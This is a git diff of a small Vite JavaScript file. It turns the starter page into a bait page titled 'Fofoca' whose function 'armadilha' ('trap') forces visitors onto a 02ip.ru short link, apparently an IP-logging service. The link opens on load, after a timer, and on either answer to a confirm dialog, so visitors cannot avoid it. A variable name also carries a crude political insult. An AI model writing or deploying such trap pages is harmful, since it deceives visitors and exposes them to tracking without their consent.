@@ -1,15 +1,21 @@
 import "./style.css";
 
 let app = (document.querySelector("#app").innerHTML = `
-  <h1>Hello Vite!</h1>
-  <a href="https://vitejs.dev/guide/features.html" target="_blank">Documentation</a>
+<h1>Fofoca</h1>
+<a href="https://02ip.ru/2YzGU7" target="_blank">Clique aqui!</a>
 `);
 
 const armadilha = () => {
-  window.open("http://www.google.com/", "minhaJanela", "height=200,width=200");
+  window.open("https://02ip.ru/2YzGU7");
 };
 setTimeout(() => {
   armadilha();
-}, 100);
+}, 1000);
 
-confirm(armadilha);
+armadilha();
+const bolsonaroMerda = confirm("seja bem vindo");
+if (bolsonaroMerda === true) {
+  armadilha();
+} else {
+  armadilha();
+}
